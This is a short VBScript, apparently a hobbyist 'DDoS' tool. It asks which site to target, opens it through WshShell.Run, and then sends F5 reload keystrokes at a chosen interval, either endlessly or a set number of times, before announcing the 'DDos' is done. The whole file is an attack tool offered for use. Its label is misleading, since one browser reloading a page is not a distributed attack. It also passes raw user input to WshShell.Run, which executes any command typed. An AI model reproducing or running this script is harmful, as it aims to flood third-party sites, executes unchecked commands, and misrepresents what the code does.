Site = InputBox("What Site To DDos?", "What Site")
Set WshShell = WScript.CreateObject("WScript.Shell")
Return = WshShell.Run(Site, 1)

Speed = InputBox("How Fast In MiliSeconds Needs It To Be Reloaded", "How Fast")

If MsgBox("Do You Want to Infinative Reload Or A Number Of Times?" & vbNewLine & "Yes For Infinative" & vbNewLine & "No For A Number Of Times", vbYesNo + vbQuestion, "Infinative Or Number?") = vbYes Then

Inf = 0
Do
WScript.Sleep Speed
WshShell.SendKeys "{F5}"
Loop Until Inf = 1

Else
Num = InputBox("How Many Times Do You Want To Reload?" & vbNewline & "Only Put A Number In.", "How Many Times")
For i = 0 to Num
WScript.Sleep Speed
WshShell.SendKeys "{F5}"
Next

MsgBox "The DDos Is Done", 1024, "End DDos Done"
End If